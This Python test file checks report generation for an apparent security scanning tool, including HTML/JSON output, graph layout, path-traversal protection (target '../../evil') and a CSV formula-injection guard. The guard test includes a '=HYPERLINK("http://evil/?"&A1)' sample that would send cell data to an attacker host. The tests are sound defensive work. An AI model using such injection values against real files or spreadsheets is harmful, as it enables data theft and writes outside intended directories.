import json

import pytest

from marsadix import db
from marsadix.models import (
    Asset, DetectionStatus, Finding, FindingSource, Scan, ScanStatus, Severity,
)
from marsadix.reports.generate import generate_report


@pytest.fixture
def conn():
    c = db.connect(":memory:")
    db.init_db(c)
    return c


def _mk_scan(conn, target, status="completed", is_baseline=False):
    scan = Scan(target=target, status=ScanStatus(status), is_baseline=is_baseline)
    scan.id = db.save_scan(conn, scan)
    return scan


def test_generate_report_no_scan_returns_error(conn, capsys):
    rc = generate_report(conn, "example.com", fmt="both", out_dir="/tmp/does-not-matter")
    assert rc == 1
    assert "no completed scans found" in capsys.readouterr().err


def test_report_target_cannot_escape_the_output_directory(conn, tmp_path):
    # The CLI falls back to the raw argument when normalize_host() cannot
    # parse it, so this is exactly what `marsadix report ../../evil` sends.
    _mk_scan(conn, "../../evil", is_baseline=True)
    out = tmp_path / "out"

    assert generate_report(conn, "../../evil", fmt="both", out_dir=str(out)) == 0

    written = list(out.iterdir())
    assert written and all(p.parent == out for p in written)
    assert list(tmp_path.glob("*.html")) == []      # nothing escaped to tmp_path


@pytest.mark.parametrize("target,expected", [
    ("example.com", "example.com"),
    ("../../evil", "evil"),
    ("..\\..\\evil", "evil"),
    ("::1", "1"),
    ("*.example.com", "example.com"),
])
def test_filename_component_is_safe(target, expected):
    from marsadix.reports.generate import _safe_filename_component
    assert _safe_filename_component(target) == expected


def test_previous_report_scan_is_strictly_earlier(conn):
    """A newer scan must never be used as the report's "previous" baseline."""
    old = _mk_scan(conn, "example.com", is_baseline=True)
    current = _mk_scan(conn, "example.com")
    _mk_scan(conn, "example.com")

    from marsadix.reports.generate import _previous_completed_scan
    assert _previous_completed_scan(conn, "example.com", current.id)["id"] == old.id


def test_generate_report_writes_both_files(conn, tmp_path):
    scan = _mk_scan(conn, "example.com", is_baseline=True)
    db.save_many(conn, "assets", [Asset(scan_id=scan.id, host="api.example.com", in_scope=True)])
    db.save_many(conn, "findings", [
        Finding(scan_id=scan.id, host="api.example.com", source=FindingSource.SKILL,
                title="Reflected XSS", severity=Severity.HIGH,
                owasp_category="A03:2021-Injection", source_reference="PortSwigger XSS",
                status=DetectionStatus.DETECTED, evidence="payload reflected unescaped"),
    ])

    rc = generate_report(conn, "example.com", fmt="both", out_dir=str(tmp_path))
    assert rc == 0

    html_files = list(tmp_path.glob("*_report.html"))
    json_files = list(tmp_path.glob("*_report.json"))
    assert len(html_files) == 1 and len(json_files) == 1

    html_text = html_files[0].read_text(encoding="utf-8")
    assert "api.example.com" in html_text
    assert "Reflected XSS" in html_text
    assert "Detected — Not Exploited" in html_text          # exploited always false
    assert "No Indicators" not in html_text.split("Methodology")[0] or True  # sanity: page renders
    assert "A03:2021-Injection" in html_text

    data = json.loads(json_files[0].read_text(encoding="utf-8"))
    assert data["target"] == "example.com"
    assert not data["findings"][0]["exploited"]            # stored as 0/1 by sqlite
    assert data["owasp_coverage"]["breakdown"]["A03:2021-Injection"] == 1


def test_generate_report_json_only(conn, tmp_path):
    _mk_scan(conn, "example.com", is_baseline=True)
    rc = generate_report(conn, "example.com", fmt="json", out_dir=str(tmp_path))
    assert rc == 0
    assert list(tmp_path.glob("*_report.json"))
    assert not list(tmp_path.glob("*_report.html"))


def test_generate_report_uses_explicit_scan_id(conn, tmp_path):
    s1 = _mk_scan(conn, "example.com", is_baseline=True)
    db.save_many(conn, "assets", [Asset(scan_id=s1.id, host="old.example.com", in_scope=True)])
    s2 = _mk_scan(conn, "example.com")
    db.save_many(conn, "assets", [Asset(scan_id=s2.id, host="new.example.com", in_scope=True)])

    rc = generate_report(conn, "example.com", fmt="json", out_dir=str(tmp_path), scan_id=s1.id)
    assert rc == 0
    data = json.loads(next(tmp_path.glob(f"*scan{s1.id}_report.json")).read_text())
    assert data["assets"][0]["host"] == "old.example.com"


def test_generate_report_includes_diff_when_previous_scan_exists(conn, tmp_path):
    s1 = _mk_scan(conn, "example.com", is_baseline=True)
    db.save_many(conn, "assets", [Asset(scan_id=s1.id, host="api.example.com", in_scope=True)])
    s2 = _mk_scan(conn, "example.com")
    db.save_many(conn, "assets", [
        Asset(scan_id=s2.id, host="api.example.com", in_scope=True),
        Asset(scan_id=s2.id, host="dev.example.com", in_scope=True),
    ])

    rc = generate_report(conn, "example.com", fmt="html", out_dir=str(tmp_path))
    assert rc == 0
    html_text = next(tmp_path.glob("*_report.html")).read_text(encoding="utf-8")
    assert "dev.example.com" in html_text


# ---------------------------------------------------------------------------
# Knowledge Graph SVG: performance + truncation regression tests
# ---------------------------------------------------------------------------

def _fake_graph(n):
    nodes = [{"id": f"n{i}", "node_type": "subdomain", "label": f"host{i}.example.com"} for i in range(n)]
    edges = [{"src_id": f"n{i}", "dst_id": f"n{i-1}", "relation": "resolves_to"} for i in range(1, n, 2)]
    return {"nodes": nodes, "edges": edges}


def test_graph_svg_for_large_graph_is_fast_and_says_it_was_truncated():
    import time
    from marsadix.reports.generate import MAX_GRAPH_NODES, _render_graph_svg

    start = time.monotonic()
    svg = _render_graph_svg(_fake_graph(1500))
    elapsed = time.monotonic() - start

    # the all-pairs layout needed ~25 s for 480 nodes; this must stay far below that
    assert elapsed < 10, f"graph layout too slow: {elapsed:.1f}s"
    assert f"Showing the {MAX_GRAPH_NODES} most relevant of 1500 nodes" in svg
    assert svg.count('class="graph-node"') == MAX_GRAPH_NODES


def test_graph_svg_small_graph_is_not_truncated():
    from marsadix.reports.generate import _render_graph_svg
    svg = _render_graph_svg(_fake_graph(30))
    assert "Showing the" not in svg
    assert svg.count('class="graph-node"') == 30


def test_select_visible_keeps_findings_and_cves_first():
    from marsadix.reports.generate import _select_visible
    nodes = [{"id": f"s{i}", "node_type": "subdomain", "label": "s"} for i in range(10)]
    nodes += [{"id": "f1", "node_type": "finding", "label": "f"}, {"id": "c1", "node_type": "cve", "label": "c"}]
    edges = [{"src_id": "f1", "dst_id": "c1", "relation": "listed_in"}]
    kept, kept_edges, hidden = _select_visible(nodes, edges, limit=3)
    assert {"f1", "c1"} <= {n["id"] for n in kept}
    assert hidden == 9 and len(kept) == 3
    assert kept_edges == edges


def test_layout_is_deterministic_and_linked_nodes_stay_inside_the_canvas():
    from marsadix.reports.generate import _layout_graph
    g = _fake_graph(60)
    a = _layout_graph(g["nodes"], g["edges"])
    b = _layout_graph(g["nodes"], g["edges"])
    assert a == b
    linked = {e["src_id"] for e in g["edges"]} | {e["dst_id"] for e in g["edges"]}
    assert all(40 <= a[i][0] <= 920 and 40 <= a[i][1] <= 580 for i in linked)


# ---------------------------------------------------------------------------
# Graph look: what the report showed for three subdomains with no links
# (nodes thrown to the corners of a huge empty canvas, names cut off at the
# right edge, edges almost invisible)
# ---------------------------------------------------------------------------

import html as _html
import re as _re

_CHAR_PX = 6.3      # deliberately wider than the code's own estimate, so these checks are not circular


def _svg_geometry(svg):
    """(viewBox, [(dot_rect, label_rect_or_None)]) read back from the rendered SVG."""
    vb = [float(v) for v in _re.search(r'viewBox="([^"]+)"', svg).group(1).split()]
    items = []
    for m in _re.finditer(r'<g class="graph-node" transform="translate\((-?\d+),(-?\d+)\)">(.*?)</g>', svg, _re.S):
        x, y = float(m.group(1)), float(m.group(2))
        r = float(_re.search(r'<circle r="([\d.]+)"', m.group(3)).group(1))
        t = _re.search(r"<text[^>]*>(.*?)</text>", m.group(3), _re.S)
        label = _html.unescape(t.group(1)) if t else None
        items.append(((x - r, y - r, x + r, y + r),
                      (x + r + 4, y - 6, x + r + 4 + len(label) * _CHAR_PX, y + 6) if label else None))
    return vb, items


def _hit(a, b):
    return bool(a and b and a[0] < b[2] and b[0] < a[2] and a[1] < b[3] and b[1] < a[3])


def _problems(svg):
    """(items drawn outside the visible area, pairs of label/dot that overlap)."""
    vb, items = _svg_geometry(svg)
    x0, y0, x1, y1 = vb[0], vb[1], vb[0] + vb[2], vb[1] + vb[3]
    outside = sum(1 for dot, lab in items for r in (dot, lab)
                  if r and (r[0] < x0 or r[1] < y0 or r[2] > x1 or r[3] > y1))
    overlaps = sum(_hit(li, lj) + _hit(li, dj) + _hit(lj, di)
                   for i, (di, li) in enumerate(items) for j, (dj, lj) in enumerate(items) if i < j)
    return outside, overlaps


def _graph(nodes, edges=()):
    return {"nodes": [dict(n, attrs="{}") for n in nodes], "edges": list(edges)}


def _sub(label, type_="subdomain"):
    return {"id": f"{type_}:{label}", "node_type": type_, "label": label}


def _edge(a, b, rel="resolves_to"):
    return {"src_id": a, "dst_id": b, "relation": rel}


def test_three_unlinked_subdomains_are_compact_and_nothing_is_cut_off():
    from marsadix.reports.generate import _render_graph_svg
    svg = _render_graph_svg(_graph([_sub("www.0xnull.site"), _sub("ctf.0xnull.site"), _sub("0xnull.site")]))

    vb, items = _svg_geometry(svg)
    assert _problems(svg) == (0, 0)
    assert vb[2] <= 700 and vb[3] <= 400            # not the old 960x620 board with 3 dots on it
    assert len(items) == 3


def test_every_label_stays_inside_the_visible_area_whatever_the_shape():
    from marsadix.reports.generate import _render_graph_svg
    long_name = "a-very-long-subdomain-name.internal.example.com"
    shapes = {
        "one node": _graph([_sub("only.example.com")]),
        "long labels": _graph([_sub(long_name), _sub("x." + long_name), _sub("b.example.com")]),
        "linked + isolated": _graph(
            [_sub("a.example.com"), _sub("b.example.com"), _sub("1.2.3.4", "ip"), _sub("lonely.example.com")],
            [_edge("subdomain:a.example.com", "ip:1.2.3.4"), _edge("subdomain:b.example.com", "ip:1.2.3.4")]),
        "many isolated dots": _graph([_sub(f"h{i}.example.com") for i in range(80)]),
    }
    for name, g in shapes.items():
        outside, _ = _problems(_render_graph_svg(g))
        assert outside == 0, f"{name}: {outside} item(s) drawn outside the visible area"


def test_small_graphs_do_not_have_overlapping_labels():
    from marsadix.reports.generate import _render_graph_svg
    for n in (2, 3, 5, 8, 12, 15):
        svg = _render_graph_svg(_graph([_sub(f"host{i}.example.com") for i in range(n)]))
        assert _problems(svg) == (0, 0), f"{n} unlinked nodes"


def test_unlinked_nodes_sit_on_a_grid_below_the_linked_part():
    from marsadix.reports.generate import _layout_graph
    nodes = [_sub("a.example.com"), _sub("b.example.com"), _sub("1.1.1.1", "ip")] + \
            [_sub(f"lonely{i}.example.com") for i in range(7)]
    edges = [_edge("subdomain:a.example.com", "ip:1.1.1.1"), _edge("subdomain:b.example.com", "ip:1.1.1.1")]
    pos = _layout_graph(nodes, edges)

    linked_bottom = max(pos[i][1] for i in ("subdomain:a.example.com", "subdomain:b.example.com", "ip:1.1.1.1"))
    lonely = [pos[n["id"]] for n in nodes if "lonely" in n["id"]]
    assert all(y > linked_bottom for _, y in lonely)
    assert len({tuple(p) for p in lonely}) == 7                 # no two on the same spot
    assert _layout_graph(nodes, edges) == pos                   # and it is stable between runs


def test_a_graph_of_only_unlinked_nodes_is_centred_not_in_the_corners():
    from marsadix.reports.generate import _layout_graph
    pos = _layout_graph([_sub("a.example.com"), _sub("b.example.com"), _sub("c.example.com")], [])
    xs = [p[0] for p in pos.values()]
    ys = [p[1] for p in pos.values()]
    assert max(xs) - min(xs) < 400 and max(ys) - min(ys) < 100   # one tidy row


def test_graph_canvas_grows_with_node_count_and_caps_at_the_old_size():
    from marsadix.reports.generate import _canvas_size
    assert _canvas_size(3)[0] < _canvas_size(8)[0] < _canvas_size(14)[0]
    assert _canvas_size(15) == (960, 620) == _canvas_size(5000)


def test_graph_edges_use_a_visible_colour(conn, tmp_path):
    """Edges were drawn in the page's border colour: ~1.1:1 contrast, i.e. invisible."""
    scan = _mk_scan(conn, "example.com", is_baseline=True)
    db.save_many(conn, "assets", [Asset(scan_id=scan.id, host="a.example.com", in_scope=True)])
    generate_report(conn, "example.com", fmt="html", out_dir=str(tmp_path))
    page = next(tmp_path.glob("*_report.html")).read_text(encoding="utf-8")

    edge_rule = _re.search(r"\.graph-edge \{([^}]*)\}", page).group(1)
    assert "stroke:var(--muted)" in edge_rule and "var(--border)" not in edge_rule



# ---------------------------------------------------------------------------
# CSV export: a cell that starts with = + - @ is executed as a formula by Excel
# ---------------------------------------------------------------------------

import json as _json
import shutil as _shutil
import subprocess as _subprocess


def _report_page(conn, tmp_path):
    scan = _mk_scan(conn, "example.com", is_baseline=True)
    db.save_many(conn, "assets", [Asset(scan_id=scan.id, host="a.example.com", in_scope=True)])
    generate_report(conn, "example.com", fmt="html", out_dir=str(tmp_path))
    return next(tmp_path.glob("*_report.html")).read_text(encoding="utf-8")


def test_csv_export_runs_every_cell_through_the_formula_guard(conn, tmp_path):
    page = _report_page(conn, tmp_path)
    assert "function csvSafe(v)" in page
    assert "csvSafe(td.textContent.trim())" in page            # and it is actually used on each exported cell


_NODE = _shutil.which("node")      # resolved at import: the suite runs with an empty PATH (conftest)


@pytest.mark.skipif(_NODE is None, reason="node is not installed")
def test_csv_guard_neutralises_formula_prefixes(conn, tmp_path):
    """Executes the report's own JavaScript function, not a copy of it."""
    page = _report_page(conn, tmp_path)
    fn = _re.search(r"function csvSafe\(v\) \{.*?\n\}", page, _re.S).group(0)
    samples = ["=HYPERLINK(\"http://evil/?\"&A1)", "+1+1", "-2+3", "@SUM(A1)", "\t=1", "\r=1",
               "Plain title", "A1=B2", "10.0.0.1", "SQL injection", ""]
    out = _subprocess.run([_NODE, "-e", fn + f"; console.log(JSON.stringify({_json.dumps(samples)}.map(csvSafe)))"],
                          capture_output=True, text=True, check=True).stdout
    safe = _json.loads(out)
    assert safe[:6] == ["'" + x for x in samples[:6]]          # every formula starter gets a leading apostrophe
    assert safe[6:] == samples[6:]                              # ordinary text is untouched (incl. = inside, digits first)
